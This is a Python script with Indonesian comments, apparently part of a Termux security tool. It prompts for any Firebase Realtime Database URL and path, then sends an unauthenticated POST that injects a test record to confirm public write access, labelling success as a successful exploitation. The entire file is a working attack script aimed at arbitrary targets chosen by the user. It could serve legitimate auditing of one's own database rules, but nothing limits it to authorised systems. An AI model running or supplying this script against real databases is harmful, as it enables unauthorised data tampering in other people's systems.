# script/firebase_db.py
import requests
import json
import time

def firebase_write_exploit_db(C):
    """
    Melakukan serangan Injeksi Data POST langsung ke Firebase Realtime Database
    untuk menguji Public Write Access.
    """
    print(C["MENU"] + "\n--- FIREBASE API WRITE EXPLOIT ---" + C["RESET"])

    # Meminta input URL DB dari pengguna (Contoh: androlin-4028a-default-rtdb.firebaseio.com)
    print(C["INPUT"] + "Masukkan URL Firebase DB Target: " + C["RESET"], end="")
    target_url = input()

    # Menghapus 'http://' atau 'https://' jika ada
    target_url = target_url.replace('http://', '').replace('https://', '')

    # Meminta input path endpoint (Contoh: /reviews)
    print(C["INPUT"] + "Masukkan Path Endpoint Target: " + C["RESET"], end="")
    endpoint_path = input()

    # Memastikan URL dibentuk dengan benar
    url = f"https://{target_url}/{endpoint_path}.json"

    # Payload injeksi data untuk membuktikan Public Write Access
    current_time = int(time.time())

    payload_data = {
        "author": "TEST-INJECTED-DATA-POC",
        "message": "Public Write Access Confirmed!",
        "timestamp": current_time,
        "payload": "Payload tag injeksi terkonfirmasi",
        "test_status": "SUCCESS"
    }

    print(C["MENU"] + f"\n[INFO] Target URL: {url}")
    print(C["MENU"] + "[INFO] Mengirim Payload untuk menguji Public Write Access...")

    try:
        response = requests.post(
            url,
            headers={'Content-Type': 'application/json'},
            data=json.dumps(payload_data)
        )

        # Analisis Respon
        if response.status_code == 200:
            print(C["SUCCESS"] + "\n✅ EKSPLOITASI BERHASIL!")
            print(f"   Status: {response.status_code} OK")
            print(f"   JSON Response (ID data baru): {response.text}")
            print(C["SUCCESS"] + "\n   ACTION: Periksa Firebase Konsol target. Data baru telah ditambahkan.")
        elif response.status_code == 401 or response.status_code == 403:
            print(C["ERROR"] + f"\n❌ EKSPLOITASI GAGAL (Akses Ditolak). Status: {response.status_code}")
            print(C["MENU"] + "   INFO: Firebase Rules diatur dengan benar (membutuhkan otentikasi).")
        else:
            print(C["ERROR"] + f"\n⚠️ PERINGATAN: Status tidak terduga: {response.status_code}")
            print(C["ERROR"] + f"   Respon Penuh: {response.text}")

    except requests.exceptions.RequestException as e:
        print(C["ERROR"] + "\n❌ ERROR KONEKSI: Pastikan URL dan koneksi internet valid.")
        print(C["ERROR"] + f"   Detail: {e}")

# Di lingkungan Termux, pastikan Anda telah menginstal: pip install requests
